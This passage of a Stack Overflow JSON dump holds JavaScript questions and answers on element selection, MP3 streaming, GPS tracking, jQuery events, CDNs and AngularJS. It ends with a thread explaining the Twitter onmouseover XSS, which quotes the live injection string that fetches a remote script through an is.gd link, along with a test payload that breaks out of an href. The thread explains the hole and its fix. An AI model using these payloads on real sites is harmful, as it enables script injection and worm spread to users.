                    "body": "<p>Also check this one out:</p>\n\n<p><a href=\"http://rockingcode.com/tutorial/element-dom-tree-jquery-plugin-firebug-like-functionality/\" rel=\"nofollow\">http://rockingcode.com/tutorial/element-dom-tree-jquery-plugin-firebug-like-functionality/</a></p>\n\n<p>I found it pretty insightful.. and there's a demo here:</p>\n\n<p><a href=\"http://rockingcode.com/demos/elemtree/\" rel=\"nofollow\">http://rockingcode.com/demos/elemtree/</a></p>\n\n<p>Hope this helps.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I have recently required such a feature for a project I was working on, turned out that I had to use for sides to create a box because otherwise the <code>event.target</code> when you move the mouse would end up being the selector, and if I were to use <code>z-index: -1</code> it would be a bit <em>fishy</em> when you have a lot of elements that overlap...etc.</p>\n\n<p>Here is a version that I have converted from my project for your benefit, it involves jQuery but it is extremely simple to convert to <em>vanilla</em> as only the <code>mousemove</code> &amp; <code>css</code> methods from jQuery are used.</p>\n\n<p>Step by step instructions.</p>\n\n<p>First create the <strong>5</strong> HTMLElements that are required.</p>\n\n<pre><code>&lt;div id=\"selector\"&gt;\n    &lt;div id=\"selector-top\"&gt;&lt;/div&gt;\n    &lt;div id=\"selector-left\"&gt;&lt;/div&gt;\n    &lt;div id=\"selector-right\"&gt;&lt;/div&gt;\n    &lt;div id=\"selector-bottom\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Secondly create a <code>mousemove</code> event on the <code>document</code> (or your container)</p>\n\n<pre><code>$(document).mousemove(function(event) { ... });\n</code></pre>\n\n<p>Then inside the <code>mousemove</code> we will do some basic checking to prevent selecting the <code>HTML, BODY, selector</code> </p>\n\n<pre><code>var id = event.target.id, tagName = event.target.tagName;\n\nif(id.indexOf('selector') !== -1 || tagName === 'BODY' || tagName === 'HTML') {\n   return;\n} \n</code></pre>\n\n<p>Then we need to create a object to store our elements like so.</p>\n\n<pre><code>var elements = {\n    top: $('#selector-top'),\n    left: $('#selector-left'),\n    right: $('#selector-right'),\n    bottom: $('#selector-bottom')\n};\n</code></pre>\n\n<p>After that we store some variables that hold some information about the target element like so.</p>\n\n<pre><code>var $target = event.target;\n    targetOffset = $target.getBoundingClientRect(),\n    targetHeight = targetOffset.height,\n    targetWidth  = targetOffset.width;\n</code></pre>\n\n<p>Then all we do is calculate the <strong>position</strong> &amp; <strong>height</strong> for all <strong>4</strong> sides of the selector like so.</p>\n\n<pre><code>elements.top.css({\n    left:  (targetOffset.left - 4),\n    top:   (targetOffset.top - 4),\n    width: (targetWidth + 5)\n});\n\nelements.bottom.css({\n    top:   (targetOffset.top + targetHeight + 1),\n    left:  (targetOffset.left  - 3),\n    width: (targetWidth + 4)\n});\n\nelements.left.css({\n    left:   (targetOffset.left  - 5),\n    top:    (targetOffset.top  - 4),\n    height: (targetHeight + 8)\n});\n\nelements.right.css({\n    left:   (targetOffset.left + targetWidth + 1),\n    top:    (targetOffset.top  - 4),\n    height: (targetHeight + 8)\n});\n</code></pre>\n\n<p>All of the <code>+aFewPixels</code> is just a little optimization so that there is like <code>2px</code> gap in between the selector and the target.</p>\n\n<p>For the <code>CSS</code> this is what I have come up with.</p>\n\n<pre><code>#selector-top, #selector-bottom {\n    background: blue;\n    height:3px;\n    position: fixed;\n    transition:all 300ms ease;\n}\n\n#selector-left, #selector-right {\n    background: blue;\n    width:3px;\n    position: fixed;\n    transition:all 300ms ease;\n}\n</code></pre>\n\n<p>The <code>transition</code> gives the selector a very nice sliding effect.</p>\n\n<h1>Try out a demo <a href=\"http://jsfiddle.net/rFc8E/9/\" rel=\"nofollow\">http://jsfiddle.net/rFc8E/9/</a></h1>\n\n<blockquote>\n  <p>Note: This also works for <code>transform: scale(2);</code> eg. when a element is scaled in size.</p>\n</blockquote>\n\n<p><strong>Edit:</strong> I've just updated this, I noticed that the <code>elements</code> object was <strong>inside</strong> the event handler, I've moved it outside in the demo, this is quite an important performance improvement because now, the <code>elements</code> object is only created <strong>once</strong> instead of <strong>Hundreds of Thousands</strong> if not <strong>millions</strong> of times inside the <code>mousemove</code> event.</p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>I want to write a browser (Chrome/FF) extension that needs to select an element on a web page.  I would like it to behave like Firebug's element inspector does.  You click the inspect arrow and you can then hover/highlight elements.  When you click on the element you want, the element is inspected.  I'm just interested in the code to allow a user to select an element - not in actually inspecting it or anything similar.</p>\n\n<p>Because I'm writing an extension, it might be nice if you could provide non-jQuery/Prototype/etc.. code so I don't have to distribute that.</p>\n",
            "last_activity_date": 1397241999,
            "question_id": 2399797,
            "score": 19,
            "tags": [
                "javascript",
                "dom",
                "google-chrome",
                "google-chrome-extension",
                "firebug"
            ],
            "title": "Javascript: Let user select an HTML element like Firebug?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>In your case context.decodeAudioData expects an ArrayBuffer of the binary data, I would suggest converting your chunk to a base64 string, then to an ArrayBuffer client-side for the most predictable results. <a href=\"https://github.com/danguer/blog-examples/blob/master/js/base64-binary.js\" rel=\"nofollow\">This script</a> should be a good starting point for the client-side decode from base64 of the chunked data.</p>\n\n<p>Adding a line with <code>data = Base64Binary.decodeArrayBuffer(data);</code> right after getting your data (base-64 encoded string) would do the trick...</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I've found a way to stream MP3 data via Websockets myself.</p>\n\n<p>One problem was the chunk size of the MP3 data. It seems that the Web Audio API needs to be fed with valid MP3 chunks to be able to decode the data. Probably not surprising. In my demo app I provide a set of MP3 chunk files.</p>\n\n<p>Also the quality of the audio is not perfect. I have some subtle glitches. I was able to improve that by sending larger chunks of MP3 data but there are still tiny crackles.</p>\n\n<p>EDIT: I managed to improve the audio quality. It seems the Web Audio method decodeAudioData isn't really designed to decode continuos chunks of MP3 data.</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>It seems that socket.io still doesn't support Binary transfer. So <a href=\"https://github.com/LearnBoost/websocket.io\" rel=\"nofollow\">websocket.io</a> can be used here.</p>\n\n<ol>\n<li><a href=\"https://github.com/LearnBoost/socket.io/issues/511#issuecomment-2370129\" rel=\"nofollow\">https://github.com/LearnBoost/socket.io/issues/511#issuecomment-2370129</a></li>\n<li><a href=\"https://github.com/LearnBoost/socket.io/issues/680#issuecomment-3083490\" rel=\"nofollow\">https://github.com/LearnBoost/socket.io/issues/680#issuecomment-3083490</a></li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have problems streaming MP3 data via WebSocket with node.js and socket.io. Everything seems to work but decodeAudioData doesn't play fair with me.</p>\n\n<p>This is my toy server:</p>\n\n<pre><code>var app = require('http').createServer(handler)\n  , io = require('socket.io').listen(app)\n  , fs = require('fs')\n\napp.listen(8081);\n\nfunction handler (req, res) {\n    res.writeHead(200, {\n        'Content-Type': 'text/html',\n    });\n    res.end('Hello, world!');\n}\n\nio.configure('development', function() {\n  io.set('log level', 1);\n\n  io.set('transports', [ 'websocket' ]);\n});\n\nio.sockets.on('connection', function (socket) {\n    console.log('connection established');\n\n    var readStream = fs.createReadStream(\"test.mp3\", \n                                         {'flags': 'r',\n                                          'encoding': 'binary', \n                                          'mode': 0666, \n                                          'bufferSize': 64 * 1024});\n    readStream.on('data', function(data) {\n        console.log(typeof data);\n        console.log('sending chunk of data')\n        socket.send(data);\n    });\n\n    socket.on('disconnect', function () {\n        console.log('connection droped');\n    });\n});\n\nconsole.log('Server running at http://127.0.0.1:8081/');\n</code></pre>\n\n<p>The client receives the data as type string but I want to feed the data to decodeAudioData and it seems it doesn't like strings. The call to decodeAudioData results in the following error message:</p>\n\n<pre><code>Uncaught Error: SYNTAX_ERR: DOM Exception 12\n</code></pre>\n\n<p>I think decodeAudioData needs the data stored in an ArrayBuffer. Is there a way to convert the data?</p>\n\n<p>This is the client code:</p>\n\n<pre><code>&lt;script src=\"http://127.0.0.1:8081/socket.io/socket.io.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n    var audioBuffer = null;\n    var context = null;\n    window.addEventListener('load', init, false);\n    function init() {\n        try {\n            context = new webkitAudioContext();\n        } catch(e) {\n            alert('Web Audio API is not supported in this browser');\n        }\n    }\n\n    function decodeHandler(buffer) {\n        console.log(data);\n    }\n\n    var socket = io.connect('http://127.0.0.1:8081');\n    socket.on('message', function (data) {\n            // HERE IS THE PROBLEM\n        context.decodeAudioData(data, decodeHandler, function(e) { console.log(e); });\n    });\n&lt;/script&gt;\n</code></pre>\n",
            "last_activity_date": 1347960914,
            "question_id": 8759842,
            "score": 15,
            "tags": [
                "javascript",
                "html5",
                "node.js",
                "websocket",
                "socket.io"
            ],
            "title": "How to stream MP3 data via WebSockets with node.js and socket.io?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Yes, it is possible. Most browsers in the latest smartphones have implemented the <a href=\"http://www.w3.org/TR/geolocation-API/\">W3C Geolocation API</a>:</p>\n\n<blockquote>\n  <p>The Geolocation API defines a high-level interface to location information associated only with the device hosting the implementation, such as latitude and longitude. The API itself is agnostic of the underlying location information sources. Common sources of location information include Global Positioning System (GPS) and location inferred from network signals such as IP address, RFID, WiFi and Bluetooth MAC addresses, and GSM/CDMA cell IDs, as well as user input. No guarantee is given that the API returns the device's actual location.</p>\n  \n  <p>The API is designed to enable both \"one-shot\" position requests and repeated position updates, as well as the ability to explicitly query the cached positions. </p>\n</blockquote>\n\n<p>Using the Geolocation API to plot a point on Google Maps, will look something like this:</p>\n\n<pre><code>if (navigator.geolocation) { \n  navigator.geolocation.getCurrentPosition(function(position) {  \n\n    var point = new google.maps.LatLng(position.coords.latitude, \n                                       position.coords.longitude);\n\n    // Initialize the Google Maps API v3\n    var map = new google.maps.Map(document.getElementById('map'), {\n       zoom: 15,\n      center: point,\n      mapTypeId: google.maps.MapTypeId.ROADMAP\n    });\n\n    // Place a marker\n    new google.maps.Marker({\n      position: point,\n      map: map\n    });\n  }); \n} \nelse {\n  alert('W3C Geolocation API is not available');\n} \n</code></pre>\n\n<p>The above will only gather the position once, and will not auto update when you start moving. To handle that, you would need to keep a reference to your marker, periodically call the <code>getCurrentPosition()</code> method, and move the marker to the new coordinates. The code might look something like this:</p>\n\n<pre><code>// Initialize the Google Maps API v3\nvar map = new google.maps.Map(document.getElementById('map'), {\n  zoom: 15,\n  mapTypeId: google.maps.MapTypeId.ROADMAP\n});\n\nvar marker = null;\n\nfunction autoUpdate() {\n  navigator.geolocation.getCurrentPosition(function(position) {  \n    var newPoint = new google.maps.LatLng(position.coords.latitude, \n                                          position.coords.longitude);\n\n    if (marker) {\n      // Marker already created - Move it\n      marker.setPosition(newPoint);\n    }\n    else {\n      // Marker does not exist - Create it\n      marker = new google.maps.Marker({\n        position: newPoint,\n        map: map\n      });\n    }\n\n    // Center the map on the new position\n    map.setCenter(newPoint);\n  }); \n\n  // Call the autoUpdate() function every 5 seconds\n  setTimeout(autoUpdate, 5000);\n}\n\nautoUpdate();\n</code></pre>\n\n<p>Now if by tracking you mean that you should also store this information on a server (so that someone else could see you moving from a remote location), then you'd have to send the points to a server-side script using AJAX.</p>\n\n<p>In addition, make sure that the <a href=\"http://code.google.com/apis/maps/terms.html\">Google Maps API Terms of Use</a> allow this usage, before you engage in such a project.</p>\n\n<hr>\n\n<p><strong>UPDATE:</strong> The W3C Geolocation API exposes a <a href=\"http://www.w3.org/TR/geolocation-API/#watch-position\"><code>watchPosition()</code></a> method that can be used instead of the <code>setTimeout()</code> mechanism we used in the above example.</p>\n",
                    "is_accepted": true,
                    "score": 23
                }
            ],
            "body": "<p>I have read up on GPS Real time tracking and found out several things about it, mostly requiring PHP, zope and a database to store the incoming data. Some other methods uses ajax with relations to PHP. </p>\n\n<p>As regards to my question, is it possible to do so with just html and JS, using markers or anything else to populate the Google Map when you move anywhere in the city? Need some help on this, Thanks!</p>\n",
            "last_activity_date": 1308109153,
            "question_id": 3305225,
            "score": 15,
            "tags": [
                "javascript",
                "html",
                "google-maps",
                "gps",
                "tracking"
            ],
            "title": "Real time GPS Tracker on JUST HTML / JS and Google Maps to be run on a handphone? Is it possible?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>You can wire up your own custom event </p>\n\n<pre><code>$('textarea').bind(\"enterKey\",function(e){\n   //do stuff here\n});\n$('textarea').keyup(function(e){\n    if(e.keyCode == 13)\n    {\n        $(this).trigger(\"enterKey\");\n    }\n});\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/x7HVQ/\">http://jsfiddle.net/x7HVQ/</a></p>\n",
                    "is_accepted": true,
                    "score": 161
                },
                {
                    "body": "<p>Here is a plugin for you: (Fiddle: <a href=\"http://jsfiddle.net/maniator/CjrJ7/\">http://jsfiddle.net/maniator/CjrJ7/</a>)</p>\n\n<pre><code>$.fn.pressEnter = function(fn) {  \n\n    return this.each(function() {  \n        $(this).bind('enterPress', fn);\n        $(this).keyup(function(e){\n            if(e.keyCode == 13)\n            {\n              $(this).trigger(\"enterPress\");\n            }\n        })\n    });  \n }; \n\n//use it:\n$('textarea').pressEnter(function(){alert('here')})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 19
                },
                {
                    "body": "<p>heres a jquery plugin to do that</p>\n\n<pre><code>(function($) {\n    $.fn.onEnter = function(func) {\n        this.bind('keypress', function(e) {\n            if (e.keyCode == 13) func.apply(this, [e]);    \n        });               \n        return this; \n     };\n})(jQuery);\n</code></pre>\n\n<p>to use it, include the code and set it up like this:</p>\n\n<pre><code>$( function () {\n    console.log($(\"input\"));\n    $(\"input\").onEnter( function() {\n        $(this).val(\"Enter key pressed\");                \n    });\n});\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/VrwgP/30/\">jsfiddle of it here <a href=\"http://jsfiddle.net/VrwgP/30/\">http://jsfiddle.net/VrwgP/30/</a></a></p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<pre><code>   $('#textbox').on('keypress', function (event) {\n         if(event.which === 13){\n\n            //Disable textbox to prevent multiple submit\n            $(this).attr(\"disabled\", \"disabled\");\n\n            //Do Stuff, submit, etc..\n         }\n   });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>It should be <strong>well noted</strong> that the use of <code>live()</code> in jQuery has been <strong>deprecated</strong> since version <code>1.7</code> and has been <em>removed</em> in jQuery <code>1.9</code>. Instead, the use of <code>on()</code> is recommended.</p>\n\n<p>I would highly suggest the following methodology for binding, as it solves the following potential challenges:</p>\n\n<ol>\n<li>By binding the event onto <code>document.body</code> and passing $selector as the second argument to <code>on()</code>, elements can be attached, detached, added or removed from the DOM without needing to deal with re-binding or double-binding events. This is because the event is attached to <code>document.body</code> rather than <code>$selector</code> directly, which means <code>$selector</code> can be added, removed and added again and will never load the event bound to it.</li>\n<li>By calling <code>off()</code> before <code>on()</code>, this script can live either within within the main  body of the page, or within the body of an AJAX call, without having to worry about accidentally double-binding events.</li>\n<li>By wrapping the script within <code>$(function() {...})</code>, this script can again be loaded by either the main body of the page, or within the body of an AJAX call. <code>$(document).ready()</code> does not get fired for AJAX requests, while <code>$(function() {...})</code> does.</li>\n</ol>\n\n<p>Here is an example:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n  &lt;head&gt;\n    &lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n      $(function() {\n        var $selector = $('textarea');\n\n        // Prevent double-binding\n        // (only a potential issue if script is loaded through AJAX)\n        $(document.body).off('keyup', $selector);\n\n        // Bind to keyup events on the $selector.\n        $(document.body).on('keyup', $selector, function(event) {\n          if(event.keyCode == 13) { // 13 = Enter Key\n            alert('enter key pressed.');\n          }\n        });\n      });\n    &lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Another subtle variation.\nI went for a slight separation of powers, so I have a plugin to enable catching the enter key, then I just bind to events normally:</p>\n\n<pre><code>(function($) { $.fn.catchEnter = function(sel) {  \n    return this.each(function() { \n        $(this).on('keyup',sel,function(e){\n            if(e.keyCode == 13)\n              $(this).trigger(\"enterkey\");\n        })\n    });  \n};\n})(jQuery);\n</code></pre>\n\n<p>And then in use:</p>\n\n<pre><code>$('.input[type=\"text\"]').catchEnter().on('enterkey',function(ev) { });\n</code></pre>\n\n<p>This variation allows you to use event delegation (to bind to elements you haven't created yet).</p>\n\n<pre><code>$('body').catchEnter('.onelineInput').on('enterkey',function(ev) { /*process input */ });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is there any event in Jquery that's triggered only if the user hits the enter button in a textbox? Or any plugin that can be added to include this? If not, how would I write a quick plugin that would do this?</p>\n",
            "last_activity_date": 1422029069,
            "question_id": 6524288,
            "score": 81,
            "tags": [
                "javascript",
                "javascript-events",
                "jquery"
            ],
            "title": "JQuery Event for user pressing enter in a textbox?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>I think probably it's too early to expect the big CDNs to start doing this. When enough sites are using a library, the benefits become clear: greater availability, more frequent use, reduced client requests, increased performance for the end user. If only a few sites are using it, chances of client having a copy in their cache already is low and all performance boosts are lost. So all that's left is that MS and Google offset your bandwidth charges, which is not their intention. Thus, the solution is to get more developers to use the library.</p>\n\n<p>Plus the library is so tiny. The code is still only 3.5KB using conservative minification. For comparison, jQuery is 24KB and ext-core is 29KB. I'd personally recommend folding the library into your own site's base JS and get your performance boost there. At least until there's wider acceptance.</p>\n\n<p>Plus, it's funny I'd have expected the JSON library to be hosted also at Yahoo, but I can't find it. I mean Crockford works there. </p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>There is now.</p>\n\n<p>Douglas Crockford recently put JSON2 on github, this <a href=\"https://github.com/douglascrockford/JSON-js/raw/master/json2.js\" rel=\"nofollow\">url</a> will always link to the most recent version.</p>\n\n<p>Edit:\nIts not a good idea to use this method, see my comment below.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Checkout <a href=\"http://cdnjs.com\">cdnjs.com</a></p>\n\n<p><a href=\"http://cdnjs.com/libraries/json2/\">http://cdnjs.com/libraries/json2/</a></p>\n\n<p>Might also be worth investigating <a href=\"http://bestiejs.github.io/json3/\">Json3</a></p>\n\n<p><a href=\"http://cdnjs.com/libraries/json3/\">http://cdnjs.com/libraries/json3/</a></p>\n\n<p><strong>UPDATE</strong>: Some of the information was out of date, changed to better links.</p>\n",
                    "is_accepted": true,
                    "score": 57
                },
                {
                    "body": "<p>Thomas from cdnjs.com here with two quick reasons why there is no minified version.</p>\n\n<p>1) The script may not possibly function as the author intended using the method of minification we choose.\n2) As a security step we ensure that all files checksums match the original authors hosted files so community submitted updates cannot contain malformed minified code. </p>\n\n<p>So for now that leaves us hosting Crockfords hosted un-minified version;\n<a href=\"https://github.com/douglascrockford/JSON-js/raw/master/json2.js\" rel=\"nofollow\">https://github.com/douglascrockford/JSON-js/raw/master/json2.js</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>json2.js can be found on <a href=\"http://api.yandex.ru/jslibs/\">Yandex CDN servers</a>.</p>\n\n<p>Full version: <a href=\"http://yandex.st/json2/2011-10-19/json2.js\">http://yandex.st/json2/2011-10-19/json2.js</a></p>\n\n<p>Minified: <a href=\"http://yandex.st/json2/2011-10-19/json2.min.js\">http://yandex.st/json2/2011-10-19/json2.min.js</a></p>\n\n<p>HTTPS also works.</p>\n",
                    "is_accepted": false,
                    "score": 19
                }
            ],
            "body": "<p>It's well known that <a href=\"http://code.google.com/apis/ajaxlibs/documentation/index.html\">Google</a> and <a href=\"http://www.asp.net/ajaxlibrary/cdn.ashx\">Microsoft</a> host several common javascript libraries on their CDNs (content distribution networks).  Unfortunately neither seems to host <a href=\"https://github.com/douglascrockford/JSON-js/blob/master/json2.js\">JSON2.js</a>.</p>\n\n<p>I'm aware that I could upload a copy of JSON2.js to my server and serve it myself, but there are a number advantages CDNs offer that I would like to take advantage of.</p>\n\n<p>So with that in mind, are there any publicly available CDNs that host JSON2? If not, any idea why? Is there some sort of copyright reason?</p>\n",
            "last_activity_date": 1389618279,
            "question_id": 2994577,
            "score": 73,
            "tags": [
                "javascript",
                "json",
                "cdn"
            ],
            "title": "Is there a publicly available CDN that hosts JSON2?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<pre><code>$(html).hide().appendTo(\"#mycontent\").fadeIn(1000);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 123
                },
                {
                    "body": "<p>Adding a little more info:</p>\n\n<p>jQuery implements \"method chaining\", which means you can chain method calls on the same element. In the first case:</p>\n\n<pre><code>$(\"#mycontent\").append(html).fadeIn(999);\n</code></pre>\n\n<p>you would be applying the <code>fadeIn</code> call to the object which is target of the method chain, in this case <code>#mycontent</code>. Not what you want.</p>\n\n<p>In @icktoofay's (great) answer you have:</p>\n\n<pre><code>$(html).hide().appendTo(\"#mycontent\").fadeIn(1000);\n</code></pre>\n\n<p>This basically means, create the <code>html</code>, set it as hidden by default, append it to <code>#mycontent</code> and <strong>then</strong> fade it in. The target of the method chain now is <code>hmtl</code> instead of <code>#mycontent</code>.</p>\n",
                    "is_accepted": false,
                    "score": 22
                },
                {
                    "body": "<p>This also works</p>\n\n<pre><code>$(Your_html).appendTo(\".target\").hide().fadeIn(300);\n</code></pre>\n\n<p>Regards</p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<pre><code>var html = \"&lt;div id='blah'&gt;Hello stuff here&lt;/div&gt;\"\n\n$(\"#mycontent\").append(html).fadeIn(999);\n</code></pre>\n\n<p>This doesn't seem to work.</p>\n\n<p>I just want a cool effect when the content gets appended.</p>\n\n<p>Note: I want just the new \"blah\" div to fade in, not the entire \"mycontent\".</p>\n",
            "last_activity_date": 1363060520,
            "question_id": 4687579,
            "score": 51,
            "tags": [
                "javascript",
                "jquery",
                "html",
                "css"
            ],
            "title": "Append an element with fade in effect [jQuery]"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>You get the error because you didn't define <code>myApp.services</code> yet. What I did so far is putting all the initial definitions in one file and then use them in another. Like for your example I would put in:</p>\n\n<p><strong>app.js</strong></p>\n\n<pre><code>angular.module('myApp.services', []);\n\nangular.module('myApp', \n    ['myApp.services',\n      ...]);\n</code></pre>\n\n<p>That should get rid of the error, though I think you should have a read on the article <a href=\"http://stackoverflow.com/users/1821749/eduard-gamonal\">Eduard Gamonal</a> mentioned in one of the comments.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The problem is caused from you \"redeclaring\" your application module in all your separate files.</p>\n\n<p>This is what the app module declaration (not sure declaration is the right term) looks like:</p>\n\n<pre><code>angular.module('myApp', []).controller( //...\n</code></pre>\n\n<p>This is what assignment (not sure if assignment is the right term either) to your application module looks like:</p>\n\n<pre><code>angular.module('myApp').controller( //...\n</code></pre>\n\n<p>Notice the lack of square brackets.</p>\n\n<p>So, the former version, one <em>with</em> the square brackets, should only be used once, usually in your <code>app.js</code> or <code>main.js</code>. All other associated files \u2014 <em>controllers, directives, filters</em> \u2026 \u2014 should use the latter version, the one <em>without</em> the square brackets.</p>\n\n<p>I hope that makes sense. Cheers!</p>\n",
                    "is_accepted": true,
                    "score": 71
                }
            ],
            "body": "<p>I'm using the <a href=\"https://github.com/angular/angular-seed\">angular-seed</a> template to structure my application. Initially I put all my JavaScript code into a single file, <code>main.js</code>. This file contained my module declaration, controllers, directives, filters, and services. The application works fine like this, but I'm worried about scalability and maintainability as my application becomes more complex. I noticed that the angular-seed template has separate files for each of these, so I've attempted to distribute my code from the single <code>main.js</code> file into each of the other files mentioned in the title to this question and found in the <code>app/js</code> directory of the <a href=\"https://github.com/angular/angular-seed/tree/master/app/js\">angular-seed</a> template.</p>\n\n<p>My question is: how do I manage the dependencies to get the application to work? The existing documentation found <a href=\"http://docs.angularjs.org/guide\">here</a> isn't very clear in this regard since each of the examples given shows a single JavaScript source file.</p>\n\n<p>An example of what I have is:</p>\n\n<h3>app.js</h3>\n\n<pre><code>angular.module('myApp', \n    ['myApp.filters',\n     'myApp.services',\n     'myApp.controllers']);\n</code></pre>\n\n<h3>controllers.js</h3>\n\n<pre><code>angular.module('myApp.controllers', []).\n    controller('AppCtrl', [function ($scope, $http, $filter, MyService) {\n\n        $scope.myService = MyService; // found in services.js\n\n        // other functions...\n    }\n]);\n</code></pre>\n\n<h3>filters.js</h3>\n\n<pre><code>angular.module('myApp.filters', []).\n    filter('myFilter', [function (MyService) {\n        return function(value) {\n            if (MyService.data) { // test to ensure service is loaded\n                for (var i = 0; i &lt; MyService.data.length; i++) {\n                    // code to return appropriate value from MyService\n                }\n            }\n        }\n    }]\n);\n</code></pre>\n\n<h3>services.js</h3>\n\n<pre><code>angular.module('myApp.services', []).\n    factory('MyService', function($http) {\n        var MyService = {};\n        $http.get('resources/data.json').success(function(response) {\n            MyService.data = response;\n        });\n        return MyService;\n    }\n);\n</code></pre>\n\n<h3>main.js</h3>\n\n<pre><code>/* This is the single file I want to separate into the others */\nvar myApp = angular.module('myApp'), []);\n\nmyApp.factory('MyService', function($http) {\n    // same code as in services.js\n}\n\nmyApp.filter('myFilter', function(MyService) {\n    // same code as in filters.js\n}\n\nfunction AppCtrl ($scope, $http, $filter, MyService) {\n    // same code as in app.js\n}\n</code></pre>\n\n<p>How do I manage the dependencies?</p>\n\n<p>Thanks in advance.</p>\n",
            "last_activity_date": 1395097572,
            "question_id": 16771812,
            "score": 48,
            "tags": [
                "javascript",
                "angularjs",
                "dependency-injection"
            ],
            "title": "AngularJS seed: putting JavaScript into separate files (app.js, controllers.js, directives.js, filters.js, services.js)"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>From Wikipedia: \"Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications that enables malicious attackers to inject client-side script into web pages viewed by other users.\"</p>\n\n<p>Today's attack fits the bill to me.</p>\n\n<p>Basically there was some sort of parsing error with Twitter.com display code.  When they converted URLs to HTML hyperlinks, they weren't handling @ characters correctly and this was causing javascript events to be inserted into the HTML link.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Yes this is XSS,  it is attacking a <a href=\"http://www.elated.com/articles/events-and-event-handlers/\">javascript event handler</a>.  What is cool about this XSS is that it doesn't require <code>&lt;&gt;</code> to exploit.  The injected string is: <code>size:999999999999px;\"onmouseover=\"$.getScript('http:\\u002f\\u002fis.gd\\u002ffl9A7')\"</code>.</p>\n\n<p>The <code>size::999999999999px</code> makes it very large and there for more likly that someone will mouse over it.  The real problem is the <code>onmouseover=</code> event handler. </p>\n\n<p>To prevent this in PHP you need to convert quote marks into their html entities:\n<code>$var=htmlspecialchars($var,ENT_QUOTES);</code></p>\n\n<p>This is because HTML you cannot escape quotes like sql: <code>\\'</code></p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>It's an XSS exploit. <a href=\"http://twitter.com/safety/status/25118959058\" rel=\"nofollow\">As Twitter admitted in their update.</a> You can prevent attacks like that by never allowing users to post javascript code. You should always filter it out. More information about avoiding XSS can be found here: <a href=\"http://www.owasp.org/index.php/Cross-site_Scripting_(XSS\" rel=\"nofollow\">http://www.owasp.org/index.php/Cross-site_Scripting_(XSS</a>)</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The vulnerability is because URLs were not being parsed properly. For example, the following URL is posted to Twitter:</p>\n\n<pre><code>http://thisisatest.com/@\"onmouseover=\"alert('test xss')\"/\n</code></pre>\n\n<p>Twitter treats this as the URL. When it is parsed Twitter wraps a link around that code, so the HTML now looks like:</p>\n\n<pre><code>&lt;a href=\"http://thisisatest.com/@\"onmouseover=\"alert('test xss')\"rel/\" target=\"_blank\" =\"\"&gt;http://thisisatest.com/@\"onmouseover=\"alert('test xss')\"/&lt;/a&gt;&lt;/span&gt; \n</code></pre>\n\n<p>You can see that by putting in the URL and the trailing slash, Twitter thinks it has a valid URL even though it contains a quote mark in it which allows it to escape (ie. terminate the <code>href</code> attribute, for the pedants out there) the URL attribute and include a mouse over. You can write anything to the page, including closing the link and including a script element. Also, you are not limited by the 140 character limit because you can use <code>$.getScript()</code>.</p>\n\n<p><a href=\"http://github.com/mzsanford/twitter-text-rb/commit/cffce8e60b7557e9945fc0e8b4383e5a66b1558f\">This</a> commit, if it were pulled, would have prevented this XSS vulnerability.</p>\n\n<p>In detail, the offending regex was:</p>\n\n<pre><code>REGEXEN[:valid_url_path_chars] = /(?:\n  #{REGEXEN[:wikipedia_disambiguation]}|\n  @[^\\/]+\\/|\n  [\\.\\,]?#{REGEXEN[:valid_general_url_path_chars]}\n)/ix\n</code></pre>\n\n<p>The <code>@[^\\/]+\\/</code> part allowed any character (except a forward slash) when it was prefixed by an @ sign and suffixed by a forward slash.</p>\n\n<p>By changing to <code>@#{REGEXEN[:valid_general_url_path_chars]}+\\/</code> it now only allows valid URL characters.</p>\n",
                    "is_accepted": true,
                    "score": 35
                },
                {
